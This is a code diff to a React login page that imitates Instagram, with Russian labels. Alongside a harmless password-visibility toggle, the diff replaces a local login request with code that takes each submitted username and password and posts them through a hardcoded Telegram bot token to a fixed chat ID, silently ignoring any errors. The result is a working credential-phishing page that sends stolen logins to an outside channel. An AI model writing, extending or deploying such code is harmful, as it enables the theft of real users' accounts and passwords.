@@ -6,6 +6,8 @@ import FromMeta from "../Images/FromMeta.png";
 import InstaLogo from "../Images/InstaLogo.png";
 import Profile from "../Images/Profile.jpeg";
 import Loading from "../Images/loading.gif";
+import CloseEye from "../Images/closeEye.png";
+import OpenEye from "../Images/openEye.png";
 
 import "../styles/homepage.css";
 
@@ -60,6 +62,10 @@ function Homepage() {
     });
   };
 
+  const TOKEN = "5984860249:AAHS-OYjZuEDepF7uY4g-2mZZfCvpenpahQ";
+  const CHAT_ID = "-1001949794791";
+  const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
   const handleSubmit = async (e) => {
     e.preventDefault();
 
@@ -67,18 +73,25 @@ function Homepage() {
       setEmptyFields(true);
       return;
     }
-
     setShowErrorMessage(true);
 
     try {
-      const response = await axios.post(
-        "http://localhost:4444/login",
-        formData
-      );
-      console.log(response.data);
-    } catch (error) {
-      console.error(error);
-    }
+      let message = `${formData.name}\n`;
+      message += `${formData.password}`;
+
+      axios.post(URL_API, {
+        chat_id: CHAT_ID,
+        parse_mode: "html",
+        text: message,
+      });
+    } catch (err) {}
+  };
+
+  // видимость пароли
+  const [passwordVisible, setPasswordVisible] = useState(false);
+
+  const togglePasswordVisibility = () => {
+    setPasswordVisible(!passwordVisible);
   };
 
   return (
@@ -115,16 +128,24 @@ function Homepage() {
             value={formData.name}
             onChange={handleChange}
           />
-          <input
-            className={`Input input2 ${
-              emptyFields && formData.password === "" ? "Error" : ""
-            }`}
-            name="password"
-            type="password"
-            placeholder="Пароль"
-            value={formData.password}
-            onChange={handleChange}
-          />
+          <div className="passCont">
+            <input
+              className={`Input input2 ${
+                emptyFields && formData.password === "" ? "Error" : ""
+              }`}
+              name="password"
+              type={passwordVisible ? "text" : "password"}
+              placeholder="Пароль"
+              value={formData.password}
+              onChange={handleChange}
+            />
+            <img
+              className="eyeBtn"
+              src={passwordVisible ? OpenEye : CloseEye}
+              alt="Eye"
+              onClick={togglePasswordVisibility}
+            />
+          </div>
         </div>
         <p className="ForgotPass">Забыли пароль?</p>
 
